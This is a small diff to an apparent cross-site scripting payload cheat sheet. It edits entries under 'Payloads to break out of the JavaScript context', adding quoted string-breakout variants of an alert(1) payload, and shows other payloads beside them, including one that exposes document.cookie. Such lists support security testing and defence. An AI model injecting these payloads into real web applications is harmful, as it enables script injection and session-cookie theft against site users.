@@ -185,7 +185,10 @@ Payloads to break out of the JavaScript context:
 xss';alert(1);'xss
 ```
 ```javascript
-'-alert(1)-'
+someString'-alert(1)-'someString
+```
+```
+someString"-alert(1)-"someString
 ```
 ```javascript
 ';alert(document.cookie);'
